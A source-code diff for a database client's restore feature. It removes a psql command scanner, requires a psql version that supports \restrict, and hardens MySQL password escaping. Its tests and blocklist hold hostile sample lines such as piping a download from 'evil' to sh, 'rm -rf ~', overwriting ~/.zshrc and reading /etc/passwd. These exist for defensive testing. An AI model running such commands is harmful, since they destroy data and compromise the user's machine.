@@ -137,108 +137,21 @@ fn pg_dbname(db: &str) -> String {
     format!("dbname='{}'", db.replace('\\', "\\\\").replace('\'', "\\'"))
 }
 
-/// Client commands in an SQL file that do something on this computer (that line). Secondary check: psql disables them with \restrict, mysql with --binary-mode.
-/// psql: \commands anywhere outside strings · comments · dollar quotes · COPY data (only \connect · \. · \encoding are allowed),
-/// mysql: system · tee · pager · source · connect … at the start of a line, and \! · \T · \P · \. · \r
+/// A mysql client command in an SQL file that does something on this computer (the line). A second check: mysql runs with --binary-mode,
+/// which switches these off. Looks for system / tee / pager / source / connect … at the start of a line, and \! \T \P \. \r \e.
+/// (psql needs no line check: it runs with \restrict, and an older psql isn't used for plain SQL)
 pub fn local_command(sql: impl std::io::BufRead, kind: DbKind) -> Option<String> {
-    if kind == DbKind::Mysql {
-        for line in sql.split(b'\n') {
-            let line = String::from_utf8_lossy(&line.ok()?).into_owned();
-            let t = line.trim_start();
-            let word = t.split_whitespace().next().unwrap_or("").to_lowercase();
-            let bad_word = ["system", "tee", "notee", "pager", "nopager", "source", "connect", "edit"].contains(&word.as_str());
-            let bad_slash = t.strip_prefix('\\').is_some_and(|c| c.starts_with(['!', 'T', 'P', '.', 'r', 'e']));
-            if bad_word || bad_slash || t.contains("\\!") {
-                return Some(line);
-            }
-        }
+    if kind != DbKind::Mysql {
         return None;
     }
-    // PostgreSQL: track state byte by byte
-    #[derive(PartialEq)]
-    enum St {
-        Code,
-        Single,
-        Double,
-        Dollar(Vec<u8>),
-        Line,
-        Block(u32),
-        Copy,
-    }
-    let mut st = St::Code;
     for line in sql.split(b'\n') {
-        let Ok(b) = line else { return Some("(can't read the file)".into()) };
-        let shown = || String::from_utf8_lossy(&b).into_owned();
-        if st == St::Copy {
-            // COPY data ends with a single \. line
-            if b.trim_ascii() == b"\\." {
-                st = St::Code;
-            }
-            continue;
-        }
-        if st == St::Line {
-            st = St::Code;
-        }
-        let mut i = 0usize;
-        while i < b.len() {
-            let c = b[i];
-            let d = b.get(i + 1).copied().unwrap_or(0);
-            match &st {
-                St::Single if c == b'\'' => st = St::Code,
-                St::Double if c == b'"' => st = St::Code,
-                St::Block(n) if c == b'*' && d == b'/' => {
-                    st = if *n == 1 { St::Code } else { St::Block(n - 1) };
-                    i += 1;
-                }
-                St::Block(n) if c == b'/' && d == b'*' => {
-                    st = St::Block(n + 1);
-                    i += 1;
-                }
-                St::Dollar(tag) if b[i..].starts_with(tag) => {
-                    i += tag.len();
-                    st = St::Code;
-                    continue;
-                }
-                St::Code => match c {
-                    b'\'' => st = St::Single,
-                    b'"' => st = St::Double,
-                    b'-' if d == b'-' => {
-                        st = St::Line;
-                        break;
-                    }
-                    b'/' if d == b'*' => {
-                        st = St::Block(1);
-                        i += 1;
-                    }
-                    b'$' => {
-                        if let Some(e) = b[i + 1..].iter().position(|&x| x == b'$').map(|p| i + 1 + p) {
-                            if std::str::from_utf8(&b[i..=e]).is_ok_and(crate::sql::is_dollar_tag) {
-                                st = St::Dollar(b[i..=e].to_vec());
-                                i = e + 1;
-                                continue;
-                            }
-                        }
-                    }
-                    b'\\' => {
-                        let name: String = b[i + 1..].iter().take_while(|x| x.is_ascii_alphanumeric() || **x == b'!' || **x == b'.' || **x == b'_').map(|&x| x as char).collect::<String>().to_lowercase();
-                        let at_line_start = b[..i].iter().all(|x| x.is_ascii_whitespace());
-                        if !(at_line_start && ["connect", "c", ".", "encoding"].contains(&name.as_str())) {
-                            return Some(shown());
-                        }
-                    }
-                    // After COPY … FROM stdin; the following lines are data (pg_dump writes COPY on one line)
-                    b';' => {
-                        let stmt = String::from_utf8_lossy(&b[..i]).to_lowercase();
-                        if stmt.trim_start().starts_with("copy ") && stmt.trim_end().ends_with("from stdin") {
-                            st = St::Copy;
-                            break;
-                        }
-                    }
-                    _ => {}
-                },
-                _ => {}
-            }
-            i += 1;
+        let line = String::from_utf8_lossy(&line.ok()?).into_owned();
+        let t = line.trim_start();
+        let word = t.split_whitespace().next().unwrap_or("").to_lowercase();
+        let bad_word = ["system", "tee", "notee", "pager", "nopager", "source", "connect", "edit"].contains(&word.as_str());
+        let bad_slash = t.strip_prefix('\\').is_some_and(|c| c.starts_with(['!', 'T', 'P', '.', 'r', 'e']));
+        if bad_word || bad_slash || t.contains("\\!") {
+            return Some(line);
         }
     }
     None
@@ -438,7 +351,9 @@ fn pg_env(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str, 
 fn my_args(cmd: &mut tokio::process::Command, host: &str, port: u16, user: &str, password: Option<&str>, cfg: &crate::store::ConnectionConfig) -> AppResult<Option<SecretTemp>> {
     let pass = match password {
         Some(p) => {
-            let t = secret_temp("qurry-my", &format!("[client]\npassword=\"{}\"\n", p.replace('\\', "\\\\").replace('"', "\\\"")))?;
+            // Option-file escapes: \\ \" and line breaks / tabs, so the value can't end the line or add options
+            let v = p.replace('\\', "\\\\").replace('"', "\\\"").replace('\n', "\\n").replace('\r', "\\r").replace('\t', "\\t");
+            let t = secret_temp("qurry-my", &format!("[client]\npassword=\"{v}\"\n"))?;
             cmd.arg(format!("--defaults-extra-file={}", t.0.display()));
             Some(t)
         }
@@ -561,12 +476,18 @@ impl AppState {
                         let src0 = sql_file.clone().unwrap_or_else(|| file.clone());
                         let tool = find_tool_for("psql", server).ok_or_else(|| missing("psql"))?;
                         // psql commands (\! · \o · \copy … program · \connect …) are disabled with \restrict. For older psql that doesn't know it, read the lines
-                        let restrict = psql_restricts(&version_of(&tool));
-                        if !restrict {
-                            refuse_local_commands(&src0, DbKind::Postgres)?;
+                        // An older psql can't switch its commands off: don't restore plain SQL with it
+                        let v = version_of(&tool);
+                        if !psql_restricts(&v) {
+                            return Err(AppError::Msg(format!(
+                                "Restoring a .sql file needs psql 17.6 / 16.10 / 15.14 / 14.19 / 13.22 or newer (it can switch psql commands off; found {}). Update the PostgreSQL client tools (macOS: brew upgrade libpq · Ubuntu: the postgresql-client package)",
+                                v.iter().map(|x| x.to_string()).collect::<Vec<_>>().join(".")
+                            )));
                         }
-                        let src = prepare_psql_input(&src0, server, restrict.then(|| uuid::Uuid::new_v4().simple().to_string()))?;
-                        if let Some(t) = sql_file.replace(src.clone()) {
+                        let src = prepare_psql_input(&src0, server, Some(uuid::Uuid::new_v4().simple().to_string()))?;
+                        // Removed however the restore ends (also when it's cancelled): it holds the whole dump and the key
+                        let _input = SecretTemp(src.clone());
+                        if let Some(t) = sql_file.take() {
                             std::fs::remove_file(t).ok();
                         }
                         let mut cmd = tokio::process::Command::new(tool);
@@ -574,11 +495,12 @@ impl AppState {
                         cmd.args(["-X", "-q", "-v", "ON_ERROR_STOP=1", "--single-transaction", "-f", "-"]);
                         let _pass = pg_env(&mut cmd, &host, port, &user, password.as_deref(), &cfg)?;
                         job.total.store(std::fs::metadata(&src).map(|m| m.len()).unwrap_or(size), Ordering::Relaxed);
-                        let r = run_tool(cmd, "psql", Some(&src), None, None, &job).await;
-                        if let Some(t) = sql_file {
-                            std::fs::remove_file(t).ok();
-                        }
-                        r?;
+                        run_tool(cmd, "psql", Some(&src), None, None, &job).await.map_err(|e| match e.to_string() {
+                            m if m.contains("backslash commands are restricted") => AppError::Msg(format!(
+                                "{m}\n(The file uses psql commands such as \\connect — e.g. a dump made with pg_dump -C or pg_dumpall. Qurry restores SQL only: restore it into the database you picked without those lines, or run it with psql yourself)"
+                            )),
+                            _ => e,
+                        })?;
                     }
                 }
                 DbKind::Mysql => {
@@ -620,18 +542,7 @@ mod tests {
 
     #[test]
     fn restore_scripts_with_local_commands_are_refused() {
-        use DbKind::{Mysql, Postgres};
-        assert!(local_command("\\connect shop\nSET x = 1;\nCREATE TABLE t (a int);\nCOPY t (a) FROM stdin;\n\\!rm -rf ~\n\\.\n".as_bytes(), Postgres).is_none());
-        for bad in ["\\! curl evil | sh", "  \\o |cat > ~/.zshrc", "\\g |sh", "\\copy t to program 'sh'", "\\i /etc/passwd", "\\setenv PAGER x"] {
-            assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Postgres).is_some(), "{bad}");
-        }
-        // Mid-line · file writes without a pipe · COPY imitated with dollar quotes
-        for bad in ["select 1; \\! id", "select 1 \\g |sh", "\\o ~/.zshrc", "\\w file", "\\copy (select 1) to '/tmp/x'", "\\lo_export 1 /tmp/x", "\\s file",
-            "select $$\ncopy t from stdin;\n$$;\n\\! id\n\\.", "\\restrict k"] {
-            assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Postgres).is_some(), "{bad}");
-        }
-        // \ inside strings · dollar quotes · comments doesn't matter
-        assert!(local_command("select E'a\\nb', 'x\\y';\n-- \\! not run\ncreate function f() returns text as $f$ select '\\!' $f$ language sql;\ninsert into t values ('line\n\\! inside a string');\n".as_bytes(), Postgres).is_none());
+        use DbKind::Mysql;
         assert!(local_command("-- MySQL dump\nCREATE TABLE t (a int);\nINSERT INTO t VALUES (1);\n".as_bytes(), Mysql).is_none());
         for bad in ["system rm -rf ~", "system\tid", "\\! id", "tee /Users/x/.zshrc", "\\T /tmp/x", "pager sh", "source /etc/passwd", "connect db evil.host"] {
             assert!(local_command(format!("select 1;\n{bad}\n").as_bytes(), Mysql).is_some(), "{bad}");
